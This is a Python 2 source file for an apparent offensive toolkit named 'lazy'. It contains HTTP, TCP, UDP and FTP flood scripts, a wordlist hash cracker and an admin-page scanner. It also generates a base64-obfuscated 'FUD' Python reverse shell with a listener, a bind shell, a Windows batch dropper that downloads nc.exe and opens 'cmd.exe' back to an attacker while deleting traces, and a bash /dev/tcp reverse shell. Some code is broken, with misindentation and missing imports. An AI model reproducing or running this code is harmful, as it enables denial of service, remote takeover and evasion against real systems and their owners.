import os.path
import smtplib, email.utils
import getpass

try:
	from colorama import init
	init()
	blue='\033[01;34m'
	red='\033[01;31m'
	green='\033[01;32m'
	yellow='\033[01;33m'
	white='\033[01;37m'
except ImportError:
	blue=''
	red=''
	green=''
	yellow=''
	white=''


scs = {'ddos':['flood/http','flood/tcp','flood/udp','flood/ftp'],'bruteforce':['offline/hashkiller','http/page_finder'],'payloads':['fud/python/reverse_shell','fud/python/bind_shell','windows/nc','linux/reverse_tcp'],'custom':os.listdir(os.getcwd()+'\\'+'custom')} # SCRIPTS
opt1 = ''
opt2 = ''

infos = {'flood/http': # Help for each script
	'Options:\nurl .... target to attack    '+opt1,'flood/tcp':
	'Options:\nhost .... target to attack    '+opt1+'\nport .... port to target    '+opt2,'flood/udp':
	'Options:\nhost .... target to attack    '+opt1+'\n','offline/hashkiller':'Options:\nhash .... hash to crack    '+opt1+'\nwordlist .... wordlist to use    '+opt2,
	'fud/python/reverse_shell':'Options:\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2,'fud/python/bind_shell':'Options:\nhost .... host to bind    '+opt1+'\nport .... port to bind    '+opt2,
	'windows/nc':'Options\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2,
	'flood/ftp':'Options:\nhost .... target to attack	'+opt1+'\nbytes .... bytes lenght to send on each connection	'+opt2,
	'http/page_finder':'Options\nurl .... url to look\t'+opt1+'\nwordlist .... name wordlist to find web page\t'+opt2,
	'linux/reverse_tcp':'Options\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2
}

for s in scs['custom']:
    infos[s] = 'Options:\nrun .... start script\t'
def custom(name):
    	script = open('custom/'+name)
	exec(script.read())
def options(script,_opt1,_opt2):
	global opt1
	global opt2
	opt1 = _opt1
	opt2 = _opt2
	if script != '':
		print infos[script]
	else:
		print '%s[!]%s Please select a script first' %(yellow,white)
		print 'Ex: "set_script <scriptname>"'
def floodhttp(url):
	import requests, sys
	counter = 0
	while 1:
		try:
			counter += 1
			requests.get(url) #// send get request to target
			sys.stdout.write('\r%s[+]%s Sending request ' %(green,white) +str(counter)+' to '+url)
		except KeyboardInterrupt:
			break
			print ''
		except requests.exceptions.ConnectionError:
			print 'Invalid host/port\n'
			break
def usage():
	print '# Usage ex:'
	print '''
(print available modules)>> lazy# modules
[1]     ddos
[2]     bruteforce
[3]     payloads

(select module to use [by number])>> lazy# use 1

(print available scripts for the modules)>> lazy/ddos# scripts
[+]flood/http
[+]flood/tcp
[+]flood/udp

(select script to use)>> lazy/ddos# set_script flood/http

(print options for selected script)>> lazy/ddos/flood/http# options
Options:
host .... target to attack
port .... port to target

(defining the values for options) {
>> lazy/ddos/flood/http# set host = google.com
>> lazy/ddos/flood/http# set port = 80

(info)>> lazy/ddos/flood/http# info
--------------------
ddos/flood/http:
[+] host = google.com
[+] port = 80

(starting the script)>> lazy/ddos/flood/http# run
[+] Sending request 15300 to google.com:80^C
>> lazy/ddos/flood/http# back
>> lazy#\n'''

def floodtcp(host,port):
	import socket, random, sys
	port = int(port)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((host,port))
		conn = True
	except socket.error:
			print "\n%s[-] %sHost is down or doesn't exists" %(red,white)
			s.close()
			conn = False
	counter = 0
	while 1:
		if conn:
			try:
				counter +=1
				msg = random._urandom(1024)
				s.send(msg)
				sys.stdout.write('\r'+str(counter)+': Sending '+str(len(msg))+' bytes to '+host+':'+str(port))
			except KeyboardInterrupt:
				s.close()
				break
			except socket.error:
				print "\n%s[-] %sHost is down or doesn't exists" %(red,white)
				s.close()
				break
		else:
			break
def floodudp(host):
	from socket import socket, AF_INET, SOCK_DGRAM
	import random, sys
	s = socket(AF_INET, SOCK_DGRAM)
	while 1:
		try:
			data = random._urandom(2048)
			port = random.randint(80,8080)
			s.sendto(data, (host, port))
			sys.stdout.write('\r%s[+]%s Sending ' %(green,white)+str(len(data))+' bytes to '+host+':'+str(port))
		except KeyboardInterrupt:
			s.close()
			break
		except socket.error:
			print "\n%s[-] %sHost is down or doesn't exists" %(red,white)
			s.close()
			break
def floodftp(host, lbytes):
	from ftplib import FTP as connect
	from ftplib import error_perm
	import socket, sys, random
	def flood(target, data):
		while 1:
			try:
				sys.stdout.write('\r'+green+'[+] '+white+'Flooding with '+str(len(data))+' bytes' )
				connect(target,data,word,timeout=0.1)
			except error_perm:
				pass
			except socket.timeout:
				pass
			except socket.error:
				pass
			except MemoryError:
				print('!> Memory error!')
				pass
			except KeyboardInterrupt:
				break
	def init():
		try:
			global word
			word = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!')
			size=int(lbytes)
			data = word*size
			flood(host, data)
		except ValueError:
			print('%s[!] %sBytes lenght must be a integer number!' %(yellow,white))
		except MemoryError:
			print('%s[!] %sBytes lenght is TOO LARGE!' %(yellow,white))
	init()
def hashkiller(wordl, hash):
	import hashlib, sys
	hashes = ['md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512']
	hashtype = raw_input(blue+'[*]'+white+' Hash type (ex: md5): ').lower()
	if hashtype in hashes:
		# verify user input
		if hashtype == 'md5':
			crack = hashlib.md5
		if hashtype == 'sha1':
			crack = hashlib.sha1
		if hashtype == 'sha224':
			crack = hashlib.sha224
		if hashtype == 'sha256':
			crack = hashlib.sha256
		if hashtype == 'sha384':
			crack = hashlib.sha384
		if hashtype == 'sha512':
			crack = hashlib.sha512
		# open e read wordlist
		with open(wordl, 'r') as rd:
			#rd = rd.readlines()
			#rd.sort(key=len)
			for counter, i in enumerate(rd): # start bruteforce
				if i.endswith('\n'):
					i = i.replace('\n','')
				sys.stdout.write('\r%s[*]%s Trying password number: %s' %(blue,white,counter))
				#sys.stdout.write('\r%s[*]%s Atual word: %s' %(blue,white,i))
				if crack(i).hexdigest() == hash: # check if encoded word is equal the parsed hash
					print '\n%s[+]%s Hash founded!' %(green,white)
					print 'Your hash is: %s' % i
					break
				else:
					pass # exception
	else:
		print yellow+"{!}"+white+" '"+hashtype+"' isn't a suported hash type"
		print "Suported hash types: "
		print ', '.join(hashes)

def listener():
	port = int(raw_input('Port to listen at: '))
	from socket import socket
	s = socket()
	host = ('', port)
	s.bind(host)
	s.listen(5)
	print blue+'[*]'+white+' Listener started at port '+str(port)
	while 1:
		try:
			c, addr = s.accept()
			print green+'[+]'+white+' Connection from', addr
			while True:
				cmd = raw_input('lazy@%s$ ' %addr[0])
				if cmd != '':
					c.send(cmd)
					print c.recv(1024) # response
		except KeyboardInterrupt:
			break
			exit()
	s.close

def fud_shell(lhost, lport): # reverse shell (.py/.pyw)
	pth = raw_input('File name (ex: payload.pyw): ')
	payload = 'from socket import socket, AF_INET, SOCK_STREAM\nfrom sys import argv\nimport os\nhost="'+lhost+'"\nport='+lport+'\ns = socket(AF_INET, SOCK_STREAM)\ns.connect((host, port))\nwhile 1:\n\tconn = s.recv(2048)\n\tif conn[:2] == "cd":\n\t\ttry:\n\t\t\tos.chdir(str(conn[3:]).strip())\n\t\t\tcmd=""\n\t\texcept:\n\t\t\tcmd=""\n\telse:\n\t\tcmd = os.popen(conn).read()\n\ts.sendall(cmd+os.getcwd()+"> ")'
	if os.path.isdir('output'):
		pth = 'output/'+pth
		_file = open(pth, 'w')
	else:
		_file = open(pth, 'w')
	print '%s[*]%s Enconding' %(blue,white)
	enc = payload.encode('base64').replace('\n','') # encode as base64
	size = len(enc)
	print '%s[*]%s Generating payload of size: %s bytes' %(blue,white,str(size))
	_file.write('p="'+enc+'"\nexec(p.decode("base64"))')
	_file.close()
	print '%s[+]%s File saved as: %s\n' %(green,white,pth)
	quest = raw_input(blue+'[*]'+white+' Do you wanna start listener right now? '+green+'(y/n): '+white)
	if quest.lower() == 'y':
		listener()
	else:
		print '%s[!]%s Exiting ...\n' %(yellow,white)

def fud_bindshell(lhost, lport): # bind shell (.py/.pyw)
	pth = raw_input('File name (ex: payload.pyw): ')
	payload = 'from socket import socket, AF_INET, SOCK_STREAM\\nimport os\\nhost="'+lhost+'"\\nport=int("'+lport+'")\\ns=socket(AF_INET, SOCK_STREAM)\\ns.bind(('',port))\\ns.listen(1)\\nwhile 1:\\n\\ttry:\\n\\t\\tc, addr = s.accept()\\n\\t\\tprint "[+] Connection from", addr\\n\\t\\twhile 1:\\n\\t\\t\\tconn = c.recv(1024)\\n\\t\\t\\tif conn[:2] == "cd":\\n\\t\\t\\t\\tos.chdir(str(conn[3:]))\\n\\t\\t\\t\\tconn = os.getcwd()\\n\\t\\t\\t\\tc.sendall(conn)\\n\\t\\t\\telse:\\n\\t\\t\\t\\tcmd = os.popen(conn).read()\\n\\t\\t\\t\\tc.sendall(cmd+"\n")\\n\\texcept KeyboardInterrupt:\\n\\t\\tbreak'
	if os.path.isdir('output'):
		pth = 'output/'+pth
		_file = open(pth, 'w')
	else:
		_file = open(pth, 'w')
	print '%s[*]%s Enconding' %(blue,white)
	enc = payload.encode('base64')
	size = len(enc)
	print '%s[*]%s Generating payload of size: %s bytes' %(blue,white,str(size))
	_file.write('p="'+enc+'"\nexec(p.decode("base64"))')
	_file.close()
	print '%s[+]%s File saved as: %s\n' %(green,white,pth)
def windows_nc(lhost, lport):
	out_name = raw_input('%sOutput basename: ' %white)
	payload ='''cd %temp%
echo @echo off >> bd.bat
echo powershell -Command "(New-Object Net.WebClient).DownloadFile('https://transfer.sh/pMOJi/nc.exe', '%temp%/nc.exe')" >>bd.bat
echo nc.exe '''+lhost+''' '''+lport+''' -e cmd.exe >>bd.bat
echo del nc.exe >> bd.bat
echo del bd.bat >> bd.bat
powershell -W hidden ./bd.bat
del bd.bat'''
	payload = base64.b64encode(payload)
	with open(out_name+'.bat','w') as out_file:
		name = str(random.randint(0,99))+lport+'_temp_'
    	code = '''@echo off
del "'''+name+'''.txt" 2>nul
del '''+name+'''.bat 2>nul
cd %temp%
echo '''+payload+''' > '''+name+'''.txt
certutil -decode '''+name+'''.txt '''+name+'''.bat >nul 2>nul
'''+name+'''.bat
del '''+name+'''.txt
del '''+name+'''.bat'''
        out_file.write(code)
        out_file.close()
        print('%s[*]%s Payload saved as: %s' %(blue,white,out_name+'.bat'))
def linux_reverse_tcp(lhost, lport):
	out_name = raw_input('%sName to output: ' %white)
	payload = 'bash &> /dev/tcp/%s/%s 0>&1' %(lhost,lport)
	with open(out_name) as backdoor:
		backdoor.write(payload)
		backdoor.close()
	print('%s[*]%s Payload saved as: %s' %(blue,white,out_name))
def admin_finder(url, wordlist):
	import requests
	#default_wordlist = ["admin.php","admin.html","index.php","login.php","login.html","administrator","admin","adminpanel","cpanel","login","wp-login.php","administrator","admins","logins","admin.asp","login.asp","adm/","admin/","admin/account.html","admin/login.html","admin/login.htm","admin/controlpanel.html","admin/controlpanel.htm","admin/adminLogin.html","admin/adminLogin.htm","admin.htm","admin.html","adminitem/","adminitems/","administrator/","administrator/login.","administrator.","administration/","administration.","adminLogin/","adminlogin.","admin_area/admin.","admin_area/","admin_area/login.","manager/","superuser/","superuser.","access/","access.","sysadm/","sysadm.","superman/","supervisor/","panel.","control/","control.","member/","member.","members/","user/","user.","cp/","uvpanel/","manage/","manage.","management/","management.","signin/","signin.","log-in/","log-in.","log_in/","log_in.","sign_in/","sign_in.","sign-in/","sign-in.","users/","users.","accounts/","accounts.","bb-admin/login.","bb-admin/admin.","bb-admin/admin.html","administrator/account.","relogin.htm","relogin.html","check.","relogin.","blog/wp-login.","user/admin.","users/admin.","registration/","processlogin.","checklogin.","checkuser.","checkadmin.","isadmin.","authenticate.","authentication.","auth.","authuser.","authadmin.","cp.","modelsearch/login.","moderator.","moderator/","controlpanel/","controlpanel.","admincontrol.","adminpanel.","fileadmin/","fileadmin.","sysadmin.","admin1.","admin1.html","admin1.htm","admin2.","admin2.html","yonetim.","yonetim.html","yonetici.","yonetici.html","phpmyadmin/","myadmin/","ur-admin.","ur-admin/","Server.","Server/","wp-admin/","administr8.","administr8/","webadmin/","webadmin.","administratie/","admins/","admins.","administrivia/","Database_Administration/","useradmin/","sysadmins/","sysadmins/","admin1/","system-administration/","administrators/","pgadmin/","directadmin/","staradmin/","ServerAdministrator/","SysAdmin/","administer/","LiveUser_Admin/","sys-admin/","typo3/","panel/","cpanel/","cpanel_file/","platz_login/","rcLogin/","blogindex/","formslogin/","autologin/","manuallogin/","simpleLogin/","loginflat/","utility_login/","showlogin/","memlogin/","login-redirect/","sub-login/","wp-login/","login1/","dir-login/","login_db/","xlogin/","smblogin/","customer_login/","UserLogin/","login-us/","acct_login/","bigadmin/","project-admins/","phppgadmin/","pureadmin/","sql-admin/","radmind/","openvpnadmin/","wizmysqladmin/","vadmind/","ezsqliteadmin/","hpwebjetadmin/","newsadmin/","adminpro/","Lotus_Domino_Admin/","bbadmin/","vmailadmin/","Indy_admin/","ccp14admin/","irc-macadmin/","banneradmin/","sshadmin/","phpldapadmin/","macadmin/","administratoraccounts/","admin4_account/","admin4_colon/","radmind-1/","Super-Admin/","AdminTools/","cmsadmin/","SysAdmin2/","globes_admin/","cadmins/","phpSQLiteAdmin/","navSiteAdmin/","server_admin_small/","logo_sysadmin/","power_user/","system_administration/","ss_vms_admin_sm/","bb-admin/","panel-administracion/","instadmin/","memberadmin/","administratorlogin/","adm.","admin_login.","panel-administracion/login.","pages/admin/admin-login.","pages/admin/","acceso.","admincp/login.","admincp/","adminarea/","admincontrol/","affiliate.","adm_auth.","memberadmin.","administratorlogin.","modules/admin/","administrators.","siteadmin/","siteadmin.","adminsite/","kpanel/","vorod/","vorod.","vorud/","vorud.","adminpanel/","PSUser/","secure/","webmaster/","webmaster.","autologin.","userlogin.","admin_area.","cmsadmin.","security/","usr/","root/","secret/","admin/login.","admin/adminLogin.","moderator.php","moderator.html","moderator/login.","moderator/admin.","yonetici.","0admin/","0manager/","aadmin/","cgi-bin/login","login1","login_admin/","login_admin","login_out/","login_out","login_user","loginerror/","loginok/","loginsave/","loginsuper/","loginsuper","login","logout/","logout","secrets/","super1/","super1","super_index","super_login","supermanager","superman","superuser","supervise/","supervise/Login","super"]
	status_codes = [200,301,201,202,203,304,307,403]
	if 'http' not in url:
		url = 'http://%s' %url
	def look_for_page(url, wordlist):
		page_counter = 0
		for page in wordlist:
			page = page.strip()
			REQUEST = requests.get(url+'/'+page)
			#print(url+'/'+page)
			#print REQUEST.status_code
			if REQUEST.status_code in status_codes:
				print('%s[+]%s %s  -  %s' %(green,white,page,REQUEST.status_code))
				page_counter+=1
		print('\n%s[i]%sTotal pages: %s' %(blue,white,page_counter))

	with open(wordlist) as wdlst:
		print('%s[*]%s Starting script...\n' %(blue,white))
		try:
			look_for_page(url, wdlst)
		except requests.exceptions.ConnectionError:
			print('%s[!]%s Connection error, host is offline!' %(red,yellow))
def run(script, opt1, opt2):
	if script == 'flood/http':
		floodhttp(opt1)
	if script == 'flood/tcp':
		floodtcp(opt1,opt2)
	if script == 'flood/udp':
		floodudp(opt1)
	if script == 'flood/ftp':
		floodftp(opt1, opt2)
	if script == 'offline/hashkiller':
		if os.path.isfile(opt2):
			hashkiller(opt2, opt1)
		else:
			print '%s{!}%s Wordlist file dont exist!' %(yellow,white)
	if script == 'fud/python/reverse_shell':
		fud_shell(opt1, opt2)
	if script == 'fud/python/bind_shell':
		fud_bindshell(opt1, opt2)
	if script == 'windows/nc':
		windows_nc(opt1, opt2)
	if opt2 == '__custom__':
		custom(script)
	if script == 'http/page_finder':
		admin_finder(opt1, opt2)
	if script == 'linux/reverse_tcp':
		linux_reverse_tcp(opt1,opt2)
